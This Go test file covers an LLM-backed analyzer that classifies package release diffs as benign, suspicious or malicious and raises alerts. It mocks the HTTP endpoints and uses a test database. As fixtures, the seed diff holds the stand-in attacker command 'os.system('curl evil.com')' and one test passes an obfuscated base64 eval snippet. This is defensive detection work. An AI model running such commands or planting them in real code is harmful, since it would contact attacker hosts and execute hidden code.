package analyzer_test

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/veilence/veilence-mx/backend/internal/usecase/analyzer"
	"github.com/veilence/veilence-mx/backend/internal/repo/persistent"
	"github.com/veilence/veilence-mx/backend/pkg/queue"
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"
)

func TestCLIClient_Type(t *testing.T) {
	client := analyzer.NewCLIClient(analyzer.CLIClientConfig{
		BaseURL:      "http://localhost",
		Model:        "test-model",
		MaxDiffLen:   1000,
		RateInterval: time.Second,
	})
	defer client.Close()
	assert.Equal(t, "copilot", client.Type())
}

func TestCLIClient_Defaults(t *testing.T) {
	client := analyzer.NewCLIClient(analyzer.CLIClientConfig{
		BaseURL:      "http://localhost",
		Model:        "test-model",
		MaxDiffLen:   1000,
		RateInterval: time.Second,
	})
	defer client.Close()
	assert.NotNil(t, client)
	assert.Equal(t, "copilot", client.Type())
}

func TestSystemPrompt(t *testing.T) {
	assert.Contains(t, analyzer.SystemPrompt, "classification")
	assert.Contains(t, analyzer.SystemPrompt, "benign")
	assert.Contains(t, analyzer.SystemPrompt, "malicious")
	assert.Contains(t, analyzer.SystemPrompt, "suspicious")
}

func TestCLIClient_Analyze_Success(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		assert.Equal(t, "/v1/chat/completions", r.URL.Path)
		assert.Equal(t, "application/json", r.Header.Get("Content-Type"))

		var req map[string]any
		json.NewDecoder(r.Body).Decode(&req)
		assert.Equal(t, "claude-opus-4.6", req["model"])

		resp := map[string]any{
			"choices": []map[string]any{
				{
					"message": map[string]any{
						"content": `{"classification":"benign","confidence":0.95,"reasoning":"Normal update"}`,
					},
				},
			},
		}
		json.NewEncoder(w).Encode(resp)
	}))
	defer srv.Close()

	client := analyzer.NewCLIClient(analyzer.CLIClientConfig{
		BaseURL:      srv.URL,
		Model:        "claude-opus-4.6",
		MaxDiffLen:   50000,
		RateInterval: 1 * time.Millisecond,
	})

	result, err := client.Analyze(context.Background(), "diff content", "requests", "python", "1.0.0", "1.1.0")
	require.NoError(t, err)
	assert.Equal(t, "benign", result.Classification)
	assert.Equal(t, 0.95, result.Confidence)
	assert.Equal(t, "Normal update", result.Reasoning)
}

func TestCLIClient_Analyze_Malicious(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		resp := map[string]any{
			"choices": []map[string]any{
				{
					"message": map[string]any{
						"content": `{"classification":"malicious","confidence":0.99,"reasoning":"Contains obfuscated eval"}`,
					},
				},
			},
		}
		json.NewEncoder(w).Encode(resp)
	}))
	defer srv.Close()

	client := analyzer.NewCLIClient(analyzer.CLIClientConfig{
		BaseURL:      srv.URL,
		RateInterval: 1 * time.Millisecond,
	})

	result, err := client.Analyze(context.Background(), "eval(base64.decode('...'))", "evil-pkg", "npm", "1.0.0", "1.0.1")
	require.NoError(t, err)
	assert.Equal(t, "malicious", result.Classification)
	assert.Equal(t, 0.99, result.Confidence)
}

func TestCLIClient_Analyze_DiffTruncation(t *testing.T) {
	var receivedPrompt string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var req map[string]any
		json.NewDecoder(r.Body).Decode(&req)
		messages := req["messages"].([]any)
		userMsg := messages[1].(map[string]any)
		receivedPrompt = userMsg["content"].(string)

		resp := map[string]any{
			"choices": []map[string]any{
				{"message": map[string]any{"content": `{"classification":"benign","confidence":0.8,"reasoning":"OK"}`}},
			},
		}
		json.NewEncoder(w).Encode(resp)
	}))
	defer srv.Close()

	client := analyzer.NewCLIClient(analyzer.CLIClientConfig{
		BaseURL:      srv.URL,
		MaxDiffLen:   100,
		RateInterval: 1 * time.Millisecond,
	})

	longDiff := strings.Repeat("x", 200)
	_, err := client.Analyze(context.Background(), longDiff, "pkg", "python", "1.0", "2.0")
	require.NoError(t, err)
	assert.Contains(t, receivedPrompt, "truncated")
}

func TestCLIClient_Analyze_429Retry(t *testing.T) {
	var attempts atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		count := attempts.Add(1)
		if count <= 2 {
			w.WriteHeader(http.StatusTooManyRequests)
			return
		}
		resp := map[string]any{
			"choices": []map[string]any{
				{"message": map[string]any{"content": `{"classification":"benign","confidence":0.9,"reasoning":"OK"}`}},
			},
		}
		json.NewEncoder(w).Encode(resp)
	}))
	defer srv.Close()

	client := analyzer.NewCLIClient(analyzer.CLIClientConfig{
		BaseURL:      srv.URL,
		RateInterval: 1 * time.Millisecond,
	})

	// This test takes ~30s due to backoff (10s + 20s). Use context with timeout to speed up.
	ctx, cancel := context.WithTimeout(context.Background(), 35*time.Second)
	defer cancel()

	result, err := client.Analyze(ctx, "diff", "pkg", "python", "1.0", "2.0")
	require.NoError(t, err)
	assert.Equal(t, "benign", result.Classification)
	assert.Equal(t, int32(3), attempts.Load())
}

func TestCLIClient_Analyze_429ExhaustedRetries(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusTooManyRequests)
	}))
	defer srv.Close()

	client := analyzer.NewCLIClient(analyzer.CLIClientConfig{
		BaseURL:      srv.URL,
		RateInterval: 1 * time.Millisecond,
	})

	ctx, cancel := context.WithTimeout(context.Background(), 65*time.Second)
	defer cancel()

	_, err := client.Analyze(ctx, "diff", "pkg", "python", "1.0", "2.0")
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "rate limited")
}

func TestCLIClient_Analyze_ServerError(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte("internal error"))
	}))
	defer srv.Close()

	client := analyzer.NewCLIClient(analyzer.CLIClientConfig{
		BaseURL:      srv.URL,
		RateInterval: 1 * time.Millisecond,
	})

	_, err := client.Analyze(context.Background(), "diff", "pkg", "python", "1.0", "2.0")
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "500")
}

func TestCLIClient_Analyze_EmptyResponse(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		resp := map[string]any{
			"choices": []map[string]any{},
		}
		json.NewEncoder(w).Encode(resp)
	}))
	defer srv.Close()

	client := analyzer.NewCLIClient(analyzer.CLIClientConfig{
		BaseURL:      srv.URL,
		RateInterval: 1 * time.Millisecond,
	})

	_, err := client.Analyze(context.Background(), "diff", "pkg", "python", "1.0", "2.0")
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "empty response")
}

func TestCLIClient_Analyze_InvalidJSON_FallbackExtraction(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		resp := map[string]any{
			"choices": []map[string]any{
				{"message": map[string]any{
					"content": `Here is my analysis: {"classification":"suspicious","confidence":0.7,"reasoning":"Unusual pattern"} based on the diff.`,
				}},
			},
		}
		json.NewEncoder(w).Encode(resp)
	}))
	defer srv.Close()

	client := analyzer.NewCLIClient(analyzer.CLIClientConfig{
		BaseURL:      srv.URL,
		RateInterval: 1 * time.Millisecond,
	})

	result, err := client.Analyze(context.Background(), "diff", "pkg", "python", "1.0", "2.0")
	require.NoError(t, err)
	assert.Equal(t, "suspicious", result.Classification)
	assert.Equal(t, 0.7, result.Confidence)
}

func TestCLIClient_Analyze_CompletelyInvalidJSON(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		resp := map[string]any{
			"choices": []map[string]any{
				{"message": map[string]any{
					"content": "This is not JSON at all, just plain text analysis.",
				}},
			},
		}
		json.NewEncoder(w).Encode(resp)
	}))
	defer srv.Close()

	client := analyzer.NewCLIClient(analyzer.CLIClientConfig{
		BaseURL:      srv.URL,
		RateInterval: 1 * time.Millisecond,
	})

	result, err := client.Analyze(context.Background(), "diff", "pkg", "python", "1.0", "2.0")
	require.NoError(t, err)
	// Fallback: returns suspicious with 0.5 confidence
	assert.Equal(t, "suspicious", result.Classification)
	assert.Equal(t, 0.5, result.Confidence)
	assert.Contains(t, result.Reasoning, "Failed to parse")
}

func TestCLIClient_Analyze_ContextCancelled(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		time.Sleep(5 * time.Second)
	}))
	defer srv.Close()

	client := analyzer.NewCLIClient(analyzer.CLIClientConfig{
		BaseURL:      srv.URL,
		RateInterval: 1 * time.Millisecond,
	})

	ctx, cancel := context.WithCancel(context.Background())
	cancel() // cancel immediately

	_, err := client.Analyze(ctx, "diff", "pkg", "python", "1.0", "2.0")
	assert.Error(t, err)
}

// mockAnalyzer implements the Analyzer interface for testing.
type mockAnalyzer struct {
	result *analyzer.Result
	err    error
	typ    string
}

func (m *mockAnalyzer) Analyze(ctx context.Context, diff string, packageName string, ecosystem string, oldVersion string, newVersion string) (*analyzer.Result, error) {
	return m.result, m.err
}

func (m *mockAnalyzer) Type() string {
	return m.typ
}

func setupTestDB(t *testing.T) *gorm.DB {
	t.Helper()
	db, err := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{})
	require.NoError(t, err)
	err = db.AutoMigrate(
		&persistent.Package{},
		&persistent.Release{},
		&persistent.Diff{},
		&persistent.Analysis{},
		&persistent.Alert{},
		&persistent.Setting{},
	)
	require.NoError(t, err)
	t.Cleanup(func() {
		sqlDB, _ := db.DB()
		sqlDB.Close()
	})
	return db
}

func seedDiffForPipeline(t *testing.T, db *gorm.DB) (persistent.Diff, persistent.Release, persistent.Release) {
	t.Helper()
	pkg := persistent.Package{Name: "test-pkg", Ecosystem: "python"}
	require.NoError(t, db.Create(&pkg).Error)

	rel1 := persistent.Release{PackageID: pkg.ID, Version: "1.0.0", Status: persistent.ReleaseStatusCompleted}
	require.NoError(t, db.Create(&rel1).Error)

	rel2 := persistent.Release{PackageID: pkg.ID, Version: "1.1.0", Status: persistent.ReleaseStatusAnalyzing}
	require.NoError(t, db.Create(&rel2).Error)

	diff := persistent.Diff{
		ReleaseID:        rel2.ID,
		PrevReleaseID:    rel1.ID,
		DiffContent:      "+import os\n+os.system('curl evil.com')",
		FileChangesCount: 1,
		LinesAdded:       2,
		LinesRemoved:     0,
	}
	require.NoError(t, db.Create(&diff).Error)

	return diff, rel1, rel2
}

func TestPipeline_ProcessDiff_Benign(t *testing.T) {
	db := setupTestDB(t)
	diff, _, rel2 := seedDiffForPipeline(t, db)

	mock := &mockAnalyzer{
		result: &analyzer.Result{
			Classification: "benign",
			Confidence:     0.95,
			Reasoning:      "Normal update",
		},
		typ: "test",
	}

	pipeline := analyzer.NewPipeline(persistent.NewPipelineRepo(db), nil, mock)
	err := pipeline.ProcessJob(context.Background(), &queue.Job{ReferenceID: diff.ID})
	require.NoError(t, err)

	// Check analysis was created
	var analysis persistent.Analysis
	require.NoError(t, db.Where("diff_id = ?", diff.ID).First(&analysis).Error)
	assert.Equal(t, persistent.ClassificationBenign, analysis.Classification)
	assert.Equal(t, 0.95, analysis.Confidence)

	// No alert for benign
	var count int64
	db.Model(&persistent.Alert{}).Count(&count)
	assert.Equal(t, int64(0), count)

	// Release status should be completed
	var updated persistent.Release
	db.First(&updated, rel2.ID)
	assert.Equal(t, persistent.ReleaseStatusCompleted, updated.Status)
}

func TestPipeline_ProcessDiff_Malicious(t *testing.T) {
	db := setupTestDB(t)
	diff, _, _ := seedDiffForPipeline(t, db)

	mock := &mockAnalyzer{
		result: &analyzer.Result{
			Classification: "malicious",
			Confidence:     0.99,
			Reasoning:      "Contains obfuscated backdoor",
		},
		typ: "test",
	}

	pipeline := analyzer.NewPipeline(persistent.NewPipelineRepo(db), nil, mock)
	err := pipeline.ProcessJob(context.Background(), &queue.Job{ReferenceID: diff.ID})
	require.NoError(t, err)

	// Check alert was created with critical severity
	var alert persistent.Alert
	require.NoError(t, db.First(&alert).Error)
	assert.Equal(t, persistent.AlertSeverityCritical, alert.Severity)
	assert.Equal(t, persistent.AlertStatusNew, alert.Status)
	assert.Contains(t, alert.Message, "malicious")
	assert.Contains(t, alert.Message, "test-pkg")
}

func TestPipeline_ProcessDiff_Suspicious(t *testing.T) {
	db := setupTestDB(t)
	diff, _, _ := seedDiffForPipeline(t, db)

	mock := &mockAnalyzer{
		result: &analyzer.Result{
			Classification: "suspicious",
			Confidence:     0.7,
			Reasoning:      "Unusual patterns",
		},
		typ: "test",
	}

	pipeline := analyzer.NewPipeline(persistent.NewPipelineRepo(db), nil, mock)
	err := pipeline.ProcessJob(context.Background(), &queue.Job{ReferenceID: diff.ID})
	require.NoError(t, err)

	// Check alert was created with medium severity
	var alert persistent.Alert
	require.NoError(t, db.First(&alert).Error)
	assert.Equal(t, persistent.AlertSeverityMedium, alert.Severity)
}

func TestPipeline_ProcessDiff_AnalyzerError(t *testing.T) {
	db := setupTestDB(t)
	diff, _, rel2 := seedDiffForPipeline(t, db)

	mock := &mockAnalyzer{
		result: nil,
		err:    fmt.Errorf("LLM unavailable"),
		typ:    "test",
	}

	pipeline := analyzer.NewPipeline(persistent.NewPipelineRepo(db), nil, mock)
	err := pipeline.ProcessJob(context.Background(), &queue.Job{ReferenceID: diff.ID})
	require.Error(t, err)
	assert.Contains(t, err.Error(), "all analyzers failed")

	// No analysis should be created
	var count int64
	db.Model(&persistent.Analysis{}).Count(&count)
	assert.Equal(t, int64(0), count)

	// Release should NOT be marked completed (stays in analyzing for retry)
	var updated persistent.Release
	db.First(&updated, rel2.ID)
	assert.Equal(t, persistent.ReleaseStatusAnalyzing, updated.Status)
}

func TestPipeline_MultipleAnalyzers(t *testing.T) {
	db := setupTestDB(t)
	diff, _, _ := seedDiffForPipeline(t, db)

	mock1 := &mockAnalyzer{
		result: &analyzer.Result{Classification: "benign", Confidence: 0.9, Reasoning: "OK"},
		typ:    "analyzer1",
	}
	mock2 := &mockAnalyzer{
		result: &analyzer.Result{Classification: "suspicious", Confidence: 0.6, Reasoning: "Maybe bad"},
		typ:    "analyzer2",
	}

	pipeline := analyzer.NewPipeline(persistent.NewPipelineRepo(db), nil, mock1, mock2)
	err := pipeline.ProcessJob(context.Background(), &queue.Job{ReferenceID: diff.ID})
	require.NoError(t, err)

	// Both analyses should be created
	var analyses []persistent.Analysis
	db.Where("diff_id = ?", diff.ID).Find(&analyses)
	assert.Len(t, analyses, 2)

	// Alert should exist (from suspicious result)
	var alert persistent.Alert
	require.NoError(t, db.First(&alert).Error)
	assert.Equal(t, persistent.AlertSeverityMedium, alert.Severity)
}
